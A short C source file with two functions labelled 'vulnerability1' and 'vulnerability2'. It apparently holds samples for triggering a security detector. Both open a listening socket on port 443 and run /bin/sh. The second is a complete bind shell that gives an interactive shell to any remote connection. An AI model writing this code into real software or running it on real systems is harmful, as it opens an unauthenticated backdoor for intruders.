
#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 

// bind socket 
int vulnerability1() 
{
    int s;
    int ret;
    struct sockaddr_in addr;
    printf("!!! triggering vulnerability1 !!!\n");

    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);

    s = socket(PF_INET, SOCK_STREAM, 0); 
    ret = bind(s, (struct sockaddr*)&addr, sizeof(addr));  
    printf("VULN: bind error is %d\n", ret);
    listen(s, 100);

    execve("/bin/sh", NULL, NULL);
    return 0;
}

int vulnerability2()
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}
